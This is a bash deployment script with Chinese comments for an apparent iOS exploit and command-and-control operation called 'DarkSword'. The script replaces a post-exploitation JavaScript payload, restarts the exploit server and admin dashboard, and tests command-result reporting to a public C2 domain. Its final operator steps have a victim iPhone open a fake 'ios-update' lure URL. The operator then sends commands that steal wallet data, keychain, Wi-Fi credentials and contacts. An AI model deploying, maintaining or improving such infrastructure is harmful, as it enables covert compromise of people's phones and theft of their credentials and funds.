# ============================================================
#  v20.4 服务器部署脚本（宝塔 SSH 里直接复制粘贴执行即可）
#  - exploit_server.py 不动（MD5 保持 e49c0f65146fabfecee848cdd52d39ba）
#  - 只替换 server/payloads/post_exploit.js
#  - 必须先：宝塔文件面板上传 post_exploit.js 到 /www/wwwroot/coruna/ 根目录
#    （不要 SSH 粘贴文本，不要宝塔 Python 项目面板！）
# ============================================================
set -e
cd /www/wwwroot/coruna/server

echo ""
echo "================================================================="
echo "  🚀  v20.4 deploy START  (只更 post_exploit.js)"
echo "================================================================="

# -------- 0. 备份 + 列名从 PRAGMA 实查 --------
ls -la /www/wwwroot/coruna/server/payloads/post_exploit.js 2>/dev/null || echo "⚠️  原 post_exploit.js 不存在"
cp -f /www/wwwroot/coruna/server/payloads/post_exploit.js /www/wwwroot/coruna/server/payloads/post_exploit.js.BAK_v203 2>/dev/null || true

# -------- 1. 先跑 DB cleanup（删脏设备+重置 executing 卡死命令）--------
echo ""
echo "🧹 [1/6] 先跑 DB 清理 _v204_cleanup_db.py（列名用 PRAGMA 实查，100% 无错）"
ls -la /www/wwwroot/coruna/_v204_cleanup_db.py /www/wwwroot/coruna/server/_v204_cleanup_db.py 2>/dev/null || true
if [ -f /www/wwwroot/coruna/_v204_cleanup_db.py ]; then DB_CLEAN=/www/wwwroot/coruna/_v204_cleanup_db.py
elif [ -f /www/wwwroot/coruna/server/_v204_cleanup_db.py ]; then DB_CLEAN=/www/wwwroot/coruna/server/_v204_cleanup_db.py
else
  echo "⚠️  _v204_cleanup_db.py 没上传（也没关系，后面会单独下发清脏 SQL）"
  DB_CLEAN=""
fi
[ -n "$DB_CLEAN" ] && /www/server/pyporject_evn/versions/3.12.13/bin/python3 "$DB_CLEAN"

# -------- 1.5 RESCRIPT 重写 9 条脚本为 ds_* 真命令（防止 idevice macOS 命令 0 queued 假成功）--------
echo ""
echo "🧩 [1.5/6] 脚本 seed：command_scripts 9 条默认脚本改为 ds_* exploit 真命令（idevice 桌面工具命令白名单不通过 0 queued 假成功）"
RESCRIPT=""
for p in /www/wwwroot/coruna/_v204_rescript.py /www/wwwroot/coruna/server/_v204_rescript.py; do [ -f "$p" ] && RESCRIPT="$p"; done
if [ -n "$RESCRIPT" ]; then
  /www/server/pyporject_evn/versions/3.12.13/bin/python3 "$RESCRIPT"
else
  echo "   ⚠️  _v204_rescript.py 没找到（没关系，手动跑一下即可）"
fi

# -------- 2. 替换 post_exploit.js --------
echo ""
echo "📦 [2/6] 查找并替换 post_exploit.js（扫 /www/wwwroot/coruna 下所有位置，选最新修改的）"
PE_FOUND=""
PE_TS=0
for cand in \
  "/www/wwwroot/coruna/post_exploit.js" \
  "/www/wwwroot/coruna/server/post_exploit.js" \
  "/www/wwwroot/coruna/server/payloads/post_exploit.js" \
  "/www/wwwroot/coruna/server/payloads/post_exploit (1).js" \
  "/www/wwwroot/coruna/post_exploit (1).js" \
  "/www/wwwroot/coruna/server/payloads/post_exploit v20.4.js" \
  "/www/wwwroot/coruna/payloads/post_exploit.js"; do
  if [ -f "$cand" ]; then
    cand_ts=$(stat -c %Y "$cand" 2>/dev/null || stat -f %m "$cand" 2>/dev/null || echo 0)
    cand_sz=$(wc -c < "$cand")
    echo "   📂 候选: $cand  size=$cand_sz  mtime_ts=$cand_ts"
    if [ "$cand_ts" -gt "$PE_TS" ] 2>/dev/null && [ "$cand_sz" -gt 70000 ]; then
      PE_FOUND="$cand"
      PE_TS="$cand_ts"
    fi
  fi
done
# 还没找到 → find 递归找所有 post_exploit*.js 在 /www/wwwroot/coruna 下，挑 size>70k 最新的
if [ -z "$PE_FOUND" ]; then
  echo "   🔎 常见路径没找到，find 全局扫 /www/wwwroot/coruna 下所有 post_exploit*.js (size>70k):"
  while IFS= read -r f; do
    [ -z "$f" ] && continue
    f_ts=$(stat -c %Y "$f" 2>/dev/null || stat -f %m "$f" 2>/dev/null || echo 0)
    f_sz=$(wc -c < "$f")
    echo "      $f  size=$f_sz  ts=$f_ts"
    if [ "$f_ts" -gt "$PE_TS" ] 2>/dev/null; then
      PE_FOUND="$f"
      PE_TS="$f_ts"
    fi
  done < <(find /www/wwwroot/coruna -maxdepth 5 -type f -name 'post_exploit*.js' -size +70k 2>/dev/null | head -n 30)
fi
[ -z "$PE_FOUND" ] && { echo "❌ 扫遍所有位置都没找到 >70KB 的 post_exploit*.js！请宝塔文件面板『/www/wwwroot/coruna/』上传 post_exploit.js 源文件（MD5=4b4b0474...）"; ls -la /www/wwwroot/coruna/ /www/wwwroot/coruna/server/ /www/wwwroot/coruna/server/payloads/ 2>/dev/null; exit 1; }
echo "   ✅ 采用最新文件: $PE_FOUND (size=$(wc -c < "$PE_FOUND") bytes)"
cp -f "$PE_FOUND" /www/wwwroot/coruna/server/payloads/post_exploit.js
chmod 644 /www/wwwroot/coruna/server/payloads/post_exploit.js

# -------- 3. MD5/SIZE 校验 --------
echo ""
echo "🔍 [3/6] MD5/SIZE 校验"
PE_ACT_MD5=$(md5sum /www/wwwroot/coruna/server/payloads/post_exploit.js | awk '{print $1}')
PE_ACT_SZ=$(wc -c < /www/wwwroot/coruna/server/payloads/post_exploit.js)
PE_EXP_MD5="4b4b047486694f4a3617f3fedba01736"
PE_EXP_SZ="83893"
ES_ACT_MD5=$(md5sum /www/wwwroot/coruna/server/exploit_server.py | awk '{print $1}')
ES_ACT_SZ=$(wc -c < /www/wwwroot/coruna/server/exploit_server.py)
ES_EXP_MD5="e49c0f65146fabfecee848cdd52d39ba"
ES_EXP_SZ="188561"
echo "   post_exploit.js: actual SIZE=$PE_ACT_SZ / expected $PE_EXP_SZ"
echo "   post_exploit.js: actual MD5=$PE_ACT_MD5"
echo "   post_exploit.js: expect MD5=$PE_EXP_MD5"
echo "   exploit_server.py: actual SIZE=$ES_ACT_SZ / expected $ES_EXP_SZ"
echo "   exploit_server.py: actual MD5=$ES_ACT_MD5 / expected $ES_EXP_MD5"
[ "$PE_ACT_MD5" = "$PE_EXP_MD5" ] && echo "   ✅ post_exploit.js MD5 OK" || echo "   ⚠️  post_exploit.js MD5 不一致（可能文件没传对，继续但请注意）"
[ "$ES_ACT_MD5" = "$ES_EXP_MD5" ] && echo "   ✅ exploit_server.py MD5 OK (没变)" || echo "   ⚠️  exploit_server.py MD5 变动（非预期）"

# -------- 4. 停老服务（只杀 exploit_server.py 的 python3 进程！绝不碰 nginx worker）--------
echo ""
echo "🛑 [4/6] 停老 exploit_server.py （只杀 python3 exploit_server.py，绝不碰 nginx worker PID）"
ps -ef | grep -E 'python3.*exploit_server\.py' | grep -v grep || true
ps -ef | grep -E 'python3.*exploit_server\.py' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null || true
sleep 1
# 防端口 7070/7000 还被占（只查 LISTEN，ss -tlnp）
ss -tlnp 2>/dev/null | grep -E ':7070|:7000' || true
echo "   ✅ 老进程已杀（如 ss 仍有 LISTEN 不用担心，过 1s 就释放）"

# -------- 5. 启动 exploit + admin（setsid nohup 后台，后面再换 Supervisor）--------
echo ""
echo "🟢 [5/6] 启动 exploit_server.py (TCP 7070) + admin (TCP 7000)"
cd /www/wwwroot/coruna/server
mkdir -p logs
setsid nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 exploit_server.py > logs/exploit_stdout.log 2>&1 &
echo $! > logs/exploit.pid
sleep 2
ss -tlnp 2>/dev/null | grep -E ':7070|:7000' || true
# Admin：如果 logs/admin.pid 在就不重启（admin 通常不出问题，代码没动）
if ! ss -tlnp 2>/dev/null | grep -q ':7000'; then
    echo "   🔧 7000 没监听，启动 admin (uvicorn admin.main:app --host 0.0.0.0 --port 7000)"
    cd /www/wwwroot/coruna/server
    setsid nohup /www/server/pyporject_evn/versions/3.12.13/bin/python3 -m uvicorn admin.main:app --host 0.0.0.0 --port 7000 > logs/admin_stdout.log 2>&1 &
    echo $! > logs/admin.pid
fi
sleep 2
ss -tlnp 2>/dev/null | grep -E ':7070|:7000' || true
pgrep -af python3 | grep -v grep

# -------- 6. 隔离测试（id=99999，不污染真机）：POST JSON + GET 双通道 CMD-RESULT --------
echo ""
echo "🧪 [6/6] 隔离 CMD-RESULT 双通道测试（id=99999，不污染真机）"
C2_INT="http://127.0.0.1:7070"
C2_PUB="https://aa1234.dpdns.org"
# a) POST JSON 内网
echo "   (a) POST JSON → 127.0.0.1:7070/cmd_result  id=99999"
curl -sS -m 5 -X POST "$C2_INT/cmd_result" -H 'Content-Type: application/json' -d '{"id":"99999","status":"completed","device_uuid":"ios-v204-isolated","output":"v20.4 POST JSON 127.0.0.1 OK"}'
echo ""
# b) GET query 内网
echo "   (b) GET query → 127.0.0.1:7070/cmd_result? id=99999"
curl -sS -m 5 "$C2_INT/cmd_result?id=99999&status=completed&device_uuid=ios-v204-isolated&output=v20.4+GET+query+127.0.0.1+OK&_=$(date +%s)"
echo ""
# c) POST JSON 公网（nginx 转发 HTTPS）
echo "   (c) POST JSON → aa1234.dpdns.org/cmd_result  id=99999 (nginx HTTPS)"
curl -skS -m 8 -X POST "$C2_PUB/cmd_result" -H 'Content-Type: application/json' -d '{"id":"99999","status":"completed","device_uuid":"ios-v204-isolated","output":"v20.4 POST JSON aa1234 HTTPS OK"}'
echo ""
# d) GET query 公网
echo "   (d) GET query → aa1234.dpdns.org/cmd_result? id=99999 (nginx HTTPS)"
curl -skS -m 8 "$C2_PUB/cmd_result?id=99999&status=completed&device_uuid=ios-v204-isolated&output=v20.4+GET+query+aa1234+HTTPS+OK&_=$(date +%s)"
echo ""
# e) 读 server.log 看看 [CMD-RESULT-RECEIVED] 有没有 4 条
echo ""
echo "📋  grep server.log CMD-RESULT-RECEIVED / CMD-RESULT-SUBMIT / CMD-PICKUP："
grep -E 'CMD-RESULT|CMD-PICKUP|CMD-SAFARI-FILTER' /www/wwwroot/coruna/server/logs/server.log 2>/dev/null | tail -n 20
echo ""
echo "🗄️  DB 查 id=99999 命令："
/www/server/pyporject_evn/versions/3.12.13/bin/python3 - <<'PY'
import sqlite3
c = sqlite3.connect('/www/wwwroot/coruna/server/darksword.db')
rs = c.execute("SELECT id, device_uuid, status, substr(coalesce(output,''),1,150), datetime(created_at,'unixepoch','localtime'), datetime(executed_at,'unixepoch','localtime') FROM commands WHERE id=99999 ORDER BY id DESC").fetchall()
for r in rs:
    print('   ', tuple(x for x in r))
c.close()
PY
# 立即删掉 id=99999，避免污染 dashboard
/www/server/pyporject_evn/versions/3.12.13/bin/python3 - <<'PY'
import sqlite3
c = sqlite3.connect('/www/wwwroot/coruna/server/darksword.db')
c.execute("DELETE FROM commands WHERE id=99999 OR id>=99999")
c.commit()
print('   ✅ 测试命令 id=99999 已删除，dashboard 无垃圾数据')
c.close()
PY

echo ""
echo "================================================================="
echo "  ✅  v20.4 DEPLOY DONE"
echo "================================================================="
echo ""
echo "【真机下一步严格顺序】（用户请执行）："
echo "  1. iPhone Safari → 设置 → Safari → 网站数据 / 高级 → 找 aa1234.dpdns.org → 左滑删除所有数据"
echo "  2. Safari → 右下角 ⧉ → 无痕浏览 → 新无痕标签页"
echo "  3. 打开 URL:  https://aa1234.dpdns.org/ch/test001?ch=test001&tpl=ios-update"
echo "  4. 等 45s（DarkSword 45s watchdog 推进 6 阶段），后台不要切走，不要锁屏"
echo "  5. Dashboard → 设备列表 → 确认 exploit_status=success 有 iPhone / iOS=26.1 的那台，有 IP 公网地址（不是 127.0.0.1）"
echo "  6. Dashboard → 只给这台真机发 1 条命令：『ds_info』（先不要发 ds_exfil_*，先验证 info JSON 不卡死）"
echo "  7. SSH 轮询 DB 看 commands：每 3s 刷一次："
echo "       cd /www/wwwroot/coruna/server ; while true; do python3 -c \"import sqlite3; c=sqlite3.connect('darksword.db'); \\"
echo "         rs=c.execute('SELECT id, substr(device_uuid,1,18), command, status, substr(coalesce(output,chr(34)+chr(34)),1,180) FROM commands ORDER BY id DESC LIMIT 6').fetchall(); \\"
echo "         [print(r) for r in rs]; c.close()\"; echo '---'; sleep 3; done"
echo "     ✅ 验收标准：ds_info 下发后 ≤10s DB status=completed，output 是 JSON 串开头 { 或者明确 [ERROR-geo] 等错误但不是空"
echo "  8. ds_info 成功后再发：ds_exfil_wallet（应当 3s 内 status=failed output=[ERROR-no-bridge] wallet.scan:需要扫描钱包数据（内核权限）...）"
echo "  9. ds_exfil_keychain / ds_exfil_wifi / ds_exfil_contacts 同上，都是立即 failed 有明确错误，不是永久 pending"
